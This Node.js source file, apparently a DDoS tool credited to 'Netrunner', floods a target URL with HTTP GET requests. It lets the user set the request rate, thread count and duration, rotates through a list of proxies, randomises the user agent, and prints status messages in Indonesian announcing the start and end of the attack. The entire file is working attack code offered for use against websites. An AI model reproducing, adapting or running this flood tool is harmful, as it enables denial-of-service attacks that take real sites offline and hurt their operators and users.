/*
 * Copyright (c) 2024 Netrunner
 * All rights reserved.
 * 
 * Unauthorized copying, modification, or distribution of this code is prohibited.
 * 
 * This software is provided "as is", without warranty of any kind.
 * 
 * For inquiries, please contact: t.me/jvnesnetrunner
 */
 const fs = require('fs');
const http = require('http');
const https = require('https');
const url = require('url');
const randomUseragent = require('random-useragent');
const chalk = require('chalk');

function loadProxies(proxyFile) {
    const proxies = fs.readFileSync(proxyFile, 'utf8').split('\n');
    return proxies.filter(proxy => proxy.trim() !== '');
}

function makeRequest(options, totalRequests, logStats) {
    const protocol = options.protocol === 'https:' ? https : http;
    const req = protocol.request(options, (res) => {
        res.on('data', () => { /* home made by NETRUNNER */ });
        res.on('end', () => {
            totalRequests++;
            if (Date.now() - logStats.lastLoggedTime >= 1000) {
                logStats.lastLoggedTime = Date.now();
                logStats.totalRequests = totalRequests;
                logStats.activeThreads = logStats.activeThreads;
                console.clear(); 
                console.log(chalk.gray('----------------------------------')); 
                console.log(chalk.blue('Home made by NETRUNNER'));
                console.log(chalk.gray('----------------------------------')); 
                console.log(chalk.gray('t.me/jvnesnetrunner')); 
                console.log(chalk.gray('----------------------------------')); 
                console.log(`Total Requests: ${logStats.totalRequests} | Active Threads: ${logStats.activeThreads}`);
                console.log(`Status Web: ${res.statusCode} - ${res.statusMessage}`);
            }
        });
    });

    req.on('error', (err) => {
        console.error(`Request gagal: ${err.message}`);
    });

    req.setHeader('Host', options.hostname);
    req.setHeader('User-Agent', randomUseragent.getRandom());
    req.setHeader('Connection', 'keep-alive');
    req.setHeader('Cache-Control', 'no-cache');
    req.setHeader('Pragma', 'no-cache');
    req.setHeader('Accept-Encoding', 'gzip, deflate, br');

    req.end();
}

function startDDoS(targetUrl, rps, threads, proxyFile, duration) {
    const parsedUrl = url.parse(targetUrl);
    const proxies = loadProxies(proxyFile);
    let totalRequests = 0;
    let logStats = { totalRequests, activeThreads: threads, lastLoggedTime: Date.now() };

    console.log("Serangan dimulai...");

    const endTime = Date.now() + (duration * 1000);

    for (let i = 0; i < threads; i++) {
        setTimeout(() => {
            logStats.activeThreads++;

            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            const proxyParts = proxy.split(':');
            const proxyHost = proxyParts[0];
            const proxyPort = proxyParts[1];

            const options = {
                protocol: parsedUrl.protocol,
                hostname: parsedUrl.hostname,
                port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                path: parsedUrl.path,
                method: 'GET',
                headers: {
                    'User-Agent': randomUseragent.getRandom(),
                    'Proxy-Connection': 'keep-alive',
                    'Host': parsedUrl.hostname,
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                },
                agent: new https.Agent({
                    rejectUnauthorized: false,
                    proxy: `http://${proxyHost}:${proxyPort}`
                })
            };

            const sendContinuousRequest = () => {
                if (Date.now() < endTime) {
                    makeRequest(options, totalRequests, logStats);
                    setTimeout(sendContinuousRequest, 1000 / rps);
                } else {
                    logStats.activeThreads--;
                    if (logStats.activeThreads === 0) {
                        console.log("Serangan selesai.");
                    }
                }
            };

            sendContinuousRequest();
        }, i * 3000);
    }
}

const args = process.argv.slice(2);
if (args.length !== 5) {
    console.error("Usage: node ddos.js <URL> <RPS> <THREADS> <PROXY_FILE> <DURATION_IN_SECONDS>");
    process.exit(1);
}

const targetUrl = args[0];
const rps = parseInt(args[1], 10);
const threads = parseInt(args[2], 10);
const proxyFile = args[3];
const duration = parseInt(args[4], 10);

if (isNaN(duration) || duration <= 0) {
    console.error("DURATION_IN_SECONDS harus berupa angka positif yang valid.");
    process.exit(1);
}

startDDoS(targetUrl, rps, threads, proxyFile, duration);
